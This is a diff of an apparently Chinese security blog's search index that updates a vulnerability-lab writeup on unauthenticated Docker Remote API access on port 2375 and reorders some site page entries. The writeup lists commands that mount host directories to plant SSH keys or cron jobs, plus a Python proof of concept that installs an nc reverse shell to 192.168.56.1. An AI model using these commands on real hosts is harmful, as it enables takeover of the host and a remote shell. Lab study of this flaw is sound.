@@ -87,7 +87,7 @@
 <li>环境启动后，将监听2375端口。</li>
 <li>测试多个环境启动失败，最后使用官方靶场推荐环境，ubuntu20.04 正常启动</li>
 </ul>
-<h1 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h1><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[http://xxx:2375/version](http://xxx:2375/version)  查看版本信息</span><br><span class="line">http://xxx:2375/info  查看info信息</span><br><span class="line">http://host:2375/containers/json 当前服务器运行容器列表信息</span><br><span class="line"></span><br><span class="line">使用命令远程连接目标执行docker 指令</span><br><span class="line">docker -H tcp://xxx:2375 images 返回远程目标的 images 信息，也可以执行其他docker命令</span><br><span class="line"></span><br><span class="line">**获取宿主机权限**</span><br><span class="line"></span><br><span class="line">远程命令运行容器并且使用 -v 参数将宿主机 /root 目录挂载到容器 /mnt/setc 目录</span><br><span class="line">随后可以将生成 ssh 公钥私钥，将公钥写入目标 /root/.ssh/authorized_keys 文件</span><br><span class="line">随后使用私钥登陆</span><br><span class="line">docker -H tcp://192.168.56.117:2375 run -it -v /root:/mnt/setc alpine:latest /bin/sh</span><br><span class="line"></span><br><span class="line">远程命令运行容器使用 -v 参数将宿主机 /etc 目录挂载到容器 /mnt/setc 目录</span><br><span class="line">随后写入定时任务命令反弹shell</span><br><span class="line">/etc/crontab   ,也可以挂载 /var/spool/cron/ 写入定时任务反弹shell</span><br><span class="line">docker -H tcp://192.168.56.117:2375 run -it -v /etc:/mnt/setc alpine:latest /bin/sh</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<h1 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h1><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">http://xxx:2375/version  查看版本信息</span><br><span class="line">http://xxx:2375/info  查看info信息</span><br><span class="line">http://host:2375/containers/json 当前服务器运行容器列表信息</span><br><span class="line"></span><br><span class="line">使用命令远程连接目标执行docker 指令</span><br><span class="line">docker -H tcp://xxx:2375 images 返回远程目标的 images 信息，也可以执行其他docker命令</span><br><span class="line"></span><br><span class="line">**获取宿主机权限**</span><br><span class="line"></span><br><span class="line">远程命令运行容器并且使用 -v 参数将宿主机 /root 目录挂载到容器 /mnt/setc 目录</span><br><span class="line">随后可以将生成 ssh 公钥私钥，将公钥写入目标 /root/.ssh/authorized_keys 文件</span><br><span class="line">随后使用私钥登陆</span><br><span class="line">docker -H tcp://192.168.56.117:2375 run -it -v /root:/mnt/setc alpine:latest /bin/sh</span><br><span class="line"></span><br><span class="line">远程命令运行容器使用 -v 参数将宿主机 /etc 目录挂载到容器 /mnt/setc 目录</span><br><span class="line">随后写入定时任务命令反弹shell</span><br><span class="line">/etc/crontab   ,也可以挂载 /var/spool/cron/ 写入定时任务反弹shell</span><br><span class="line">docker -H tcp://192.168.56.117:2375 run -it -v /etc:/mnt/setc alpine:latest /bin/sh</span><br><span class="line"></span><br></pre></td></tr></table></figure>
 
 <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">py poc 代码</span><br><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line">import docker</span><br><span class="line"></span><br><span class="line">client = docker.DockerClient(base_url=<span class="string">&#x27;http://192.168.56.117:2375/&#x27;</span>)</span><br><span class="line">data = client.containers.run(<span class="string">&#x27;alpine:latest&#x27;</span>, r<span class="string">&#x27;&#x27;</span><span class="string">&#x27;sh -c &quot;echo &#x27;</span>* * * * * /usr/bin/nc 192.168.56.1 1111 -e /bin/sh<span class="string">&#x27; &gt;&gt; /tmp/etc/crontabs/root&quot; &#x27;</span><span class="string">&#x27;&#x27;</span>, remove=True, volumes=&#123;<span class="string">&#x27;/etc&#x27;</span>: &#123;<span class="string">&#x27;bind&#x27;</span>: <span class="string">&#x27;/tmp/etc&#x27;</span>, <span class="string">&#x27;mode&#x27;</span>: <span class="string">&#x27;rw&#x27;</span>&#125;&#125;)</span><br></pre></td></tr></table></figure>
 
@@ -749,11 +749,6 @@
 ]]></content>
   </entry>
   <entry>
-    <title>分类</title>
-    <url>/categories/index.html</url>
-    <content><![CDATA[]]></content>
-  </entry>
-  <entry>
     <title>图库</title>
     <url>/images/index.html</url>
     <content><![CDATA[<div class="gallery-group-main">
@@ -803,13 +798,13 @@
 ]]></content>
   </entry>
   <entry>
-    <title>友情链接</title>
-    <url>/link/index.html</url>
+    <title>分类</title>
+    <url>/categories/index.html</url>
     <content><![CDATA[]]></content>
   </entry>
   <entry>
-    <title>标签</title>
-    <url>/tags/index.html</url>
+    <title>友情链接</title>
+    <url>/link/index.html</url>
     <content><![CDATA[]]></content>
   </entry>
   <entry>
@@ -838,6 +833,11 @@
 
 
 ]]></content>
+  </entry>
+  <entry>
+    <title>标签</title>
+    <url>/tags/index.html</url>
+    <content><![CDATA[]]></content>
   </entry>
   <entry>
     <title>图库</title>
